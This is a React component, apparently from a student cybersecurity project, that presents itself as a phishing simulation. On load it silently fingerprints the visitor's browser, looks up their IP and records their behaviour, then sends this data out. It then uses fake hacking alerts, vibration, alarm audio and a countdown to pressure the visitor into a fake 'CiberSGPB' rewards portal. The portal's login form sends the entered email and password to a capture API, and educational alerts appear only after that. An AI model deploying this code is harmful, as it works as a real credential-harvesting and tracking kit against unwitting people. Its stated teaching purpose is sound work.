import { useState, useEffect, useRef } from 'react';
import { collectFingerprint, safeVibrate } from '../utils/fingerprint';
import { captureData } from '../utils/api';

/**
 * PhishingPage - Exact React version of glitch.html
 *
 * ⚠️ EDUCATIONAL CYBERSECURITY PROJECT ⚠️
 * Converted from CiberSGPB phishing simulation
 */

const PhishingPageNew = () => {
  // Refs for DOM elements
  const audioRef = useRef(null);
  const terminalRef = useRef(null);

  // State
  const [isLoading, setIsLoading] = useState(true);
  const [showGlitch, setShowGlitch] = useState(false);
  const [showHacking, setShowHacking] = useState(false);
  const [showWarning, setShowWarning] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [countdown, setCountdown] = useState(10);
  const [terminalLines, setTerminalLines] = useState([]);
  const [formData, setFormData] = useState({ email: '', password: '' });

  // Behavior tracking
  const startTimeRef = useRef(Date.now());
  const behaviorRef = useRef({
    mouseMovements: 0,
    clicks: 0,
    scrolls: 0,
  });

  // Track behavior
  useEffect(() => {
    const handleMouseMove = () => behaviorRef.current.mouseMovements++;
    const handleClick = () => behaviorRef.current.clicks++;
    const handleScroll = () => behaviorRef.current.scrolls++;

    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('click', handleClick);
    window.addEventListener('scroll', handleScroll);

    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('click', handleClick);
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  // Type text effect
  const typeText = async (text, speed = 50) => {
    for (let i = 0; i < text.length; i++) {
      await new Promise(resolve => setTimeout(resolve, speed));
      setTerminalLines(prev => {
        const newLines = [...prev];
        if (newLines.length === 0 || newLines[newLines.length - 1].complete) {
          newLines.push({ text: text[i], complete: false });
        } else {
          newLines[newLines.length - 1].text += text[i];
        }
        return newLines;
      });
    }
    setTerminalLines(prev => {
      const newLines = [...prev];
      newLines[newLines.length - 1].complete = true;
      return newLines;
    });
  };

  // Show hacking sequence
  const showHackingSequence = async () => {
    setTerminalLines([]);

    await typeText('> ACCESO NO AUTORIZADO DETECTADO', 30);
    await new Promise(r => setTimeout(r, 400));
    await typeText('> Iniciando protocolos de seguridad...', 30);
    await new Promise(r => setTimeout(r, 600));
    await typeText('> Rastreando dispositivo...', 30);
    await new Promise(r => setTimeout(r, 500));
    await typeText('> IP: ' + (await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'xxx.xxx.xxx.xxx')), 30);
    await new Promise(r => setTimeout(r, 400));
    await typeText('> Dispositivo: ' + navigator.platform, 30);
    await new Promise(r => setTimeout(r, 400));
    await typeText('> Navegador: ' + navigator.userAgent.split(' ').pop(), 30);
    await new Promise(r => setTimeout(r, 600));
    await typeText('> Recopilando información del sistema...', 30);
    await new Promise(r => setTimeout(r, 800));
    await typeText('> ADVERTENCIA: Actividad sospechosa registrada', 30);
    await new Promise(r => setTimeout(r, 500));
    await typeText('> Iniciando verificación de identidad...', 30);
  };

  // Countdown timer
  useEffect(() => {
    if (showWarning && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else if (showWarning && countdown === 0) {
      setShowWarning(false);
      setShowForm(true);
    }
  }, [showWarning, countdown]);

  // Main sequence
  useEffect(() => {
    const runSequence = async () => {
      // 1. Start capture in background (don't wait for it)
      (async () => {
        try {
          console.log('🔍 Capturing data...');
          const fingerprint = await collectFingerprint();
          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);

          await captureData({
            ...fingerprint,
            behavior: { ...behaviorRef.current, timeOnPage },
            metadata: {
              userSubmitted: false,
              formData: { email: null, password: null }
            },
            timestamp: new Date().toISOString(),
          });
          console.log('✅ Data captured');
        } catch (error) {
          console.error('❌ Capture error:', error);
        }
      })();

      // 2. Wait 7 seconds (loading) - continues independently
      await new Promise(r => setTimeout(r, 7000));
      setIsLoading(false);

      // 3. Wait a moment
      await new Promise(r => setTimeout(r, 500));

      // 4. Vibrate and show glitch
      safeVibrate([200, 100, 200, 100, 200, 100, 200]);
      setShowGlitch(true);
      setShowHacking(true);

      // 5. More vibration
      setTimeout(() => safeVibrate([100, 80, 100, 80, 100, 80, 100]), 300);
      setTimeout(() => safeVibrate([100, 80, 100, 80, 100]), 1200);

      // 6. Show hacking sequence
      await showHackingSequence();

      // 7. Wait
      await new Promise(r => setTimeout(r, 1000));

      // 8. Show warning with audio
      setShowWarning(true);
      safeVibrate([500, 200, 500, 200, 500, 200, 500]);

      if (audioRef.current) {
        audioRef.current.volume = 1.0;
        audioRef.current.play().catch(err => console.error('Audio error:', err));
      }
    };

    runSequence();
  }, []);

  // Handle form submit
  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const fingerprint = await collectFingerprint();
      const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);

      await captureData({
        ...fingerprint,
        behavior: { ...behaviorRef.current, timeOnPage },
        metadata: {
          userSubmitted: true,
          formData: {
            email: formData.email,
            password: formData.password
          }
        },
        timestamp: new Date().toISOString(),
      });

      // Show educational alerts
      alert('⚠️ ¡ATENCIÓN! Acabas de caer en una simulación de phishing educativa.\n\nEsto es parte del proyecto "Ciberseguridad del Bienestar".');
      alert('🔍 HUELLA DIGITAL: Se recopiló información de tu navegador usando técnicas de fingerprinting.');
      alert('🌐 WEBRTC: Tu dirección IP real pudo haber sido revelada.');
      alert('📍 GEOLOCALIZACIÓN: Se intentó acceder a tu ubicación GPS.');
      alert('👁️ RASTREO: Cada movimiento del mouse y clic fue registrado.');
      alert('✅ PROTECCIÓN:\n• Verifica siempre las URLs\n• Usa 2FA\n• Passwords únicos\n• Desconfía de urgencias');

      window.location.reload();
    } catch (error) {
      console.error('Submit error:', error);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white font-mono overflow-hidden">
      <audio ref={audioRef} src="/AudioCOnsequence.mp3" preload="auto" />

      {/* Loading Screen */}
      {isLoading && (
        <div className="fixed inset-0 bg-black flex items-center justify-center z-50">
          <div className="text-center">
            <div className="inline-block animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-apex-red mb-4"></div>
            <p className="text-xl text-apex-green">Cargando contenido...</p>
          </div>
        </div>
      )}

      {/* Glitch Overlay */}
      {showGlitch && (
        <div className="fixed inset-0 bg-apex-red opacity-20 pointer-events-none z-40 animate-glitch-intense"></div>
      )}

      {/* Hacking Screen */}
      {showHacking && !showWarning && !showForm && (
        <div className="fixed inset-0 bg-black flex items-center justify-center z-30 p-4">
          <div className="bg-gray-900 border-2 border-apex-green rounded-lg p-6 max-w-4xl w-full">
            <div className="flex items-center mb-4 border-b border-gray-700 pb-2">
              <div className="flex space-x-2">
                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                <div className="w-3 h-3 rounded-full bg-green-500"></div>
              </div>
              <span className="ml-4 text-gray-400">terminal@security-scan</span>
            </div>
            <div ref={terminalRef} className="space-y-1 text-apex-green text-sm">
              {terminalLines.map((line, index) => (
                <div key={index}>
                  {line.text}
                  {!line.complete && <span className="animate-pulse">▋</span>}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Warning Box */}
      {showWarning && (
        <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-30 p-4">
          <div className="apex-card max-w-2xl w-full border-apex-red border-4 animate-pulse text-center">
            <div className="text-6xl mb-4">🔍📊🔍</div>
            <h2 className="text-4xl font-bold text-apex-red mb-6 animate-glitch">
              ¡ADVERTENCIA DE SEGURIDAD!
            </h2>
            <p className="text-xl mb-6 text-gray-300">
              Se ha detectado actividad sospechosa en tu cuenta de CiberSGPB
            </p>
            <p className="text-lg mb-4 text-gray-400">
              Alguien intentó acceder desde una ubicación desconocida
            </p>
            <p className="text-lg mb-8 text-gray-400">
              Verifica tu identidad para asegurar tu cuenta y reclamar recompensas pendientes
            </p>
            <div className="text-8xl font-bold text-apex-red mb-4">
              {countdown}
            </div>
            <p className="text-sm text-gray-500">
              Redirigiendo a página de verificación segura...
            </p>
          </div>
        </div>
      )}

      {/* Form */}
      {showForm && (
        <div className="min-h-screen bg-gradient-to-br from-apex-dark via-gray-900 to-black p-4 flex items-center justify-center">
          <div className="max-w-md w-full">
            <div className="text-center mb-8">
              <h1 className="text-5xl font-bold mb-2">
                <span className="text-apex-red">CiberSGPB</span> <span className="text-white">PORTAL</span>
              </h1>
              <p className="text-apex-gold text-xl">Verificación de Cuenta Requerida</p>
            </div>

            <div className="apex-card">
              <div className="text-center mb-6">
                <div className="text-4xl mb-3">🎁</div>
                <h2 className="text-2xl font-bold text-apex-gold mb-2">
                  ¡Reclama tus Recompensas Exclusivas!
                </h2>
                <p className="text-gray-400">
                  Oferta por tiempo limitado: Acceso Premium + Beneficios Exclusivos
                </p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium mb-2 text-gray-300">
                    Email o Usuario
                  </label>
                  <input
                    type="text"
                    value={formData.email}
                    onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                    className="apex-input"
                    placeholder="Ingresa tu email o usuario"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium mb-2 text-gray-300">
                    Contraseña
                  </label>
                  <input
                    type="password"
                    value={formData.password}
                    onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                    className="apex-input"
                    placeholder="Ingresa tu contraseña"
                  />
                </div>

                <button type="submit" className="apex-button w-full">
                  RECLAMAR RECOMPENSAS AHORA
                </button>
              </form>

              <div className="mt-6 text-center text-xs text-gray-500">
                <p>🔒 Conexión segura establecida</p>
                <p className="mt-2">Al continuar, aceptas nuestros Términos de Servicio</p>
              </div>
            </div>

            <div className="mt-6 flex justify-center space-x-4 text-xs text-gray-600">
              <span>✓ SSL Asegurado</span>
              <span>✓ Verificado por EA</span>
              <span>✓ Confiado por 10M+ jugadores</span>
            </div>

            <footer className="mt-12 text-center text-xs text-gray-700">
              <p>⚠️ Proyecto Educativo de Ciberseguridad - Demostración Académica</p>
            </footer>
          </div>
        </div>
      )}
    </div>
  );
};

export default PhishingPageNew;
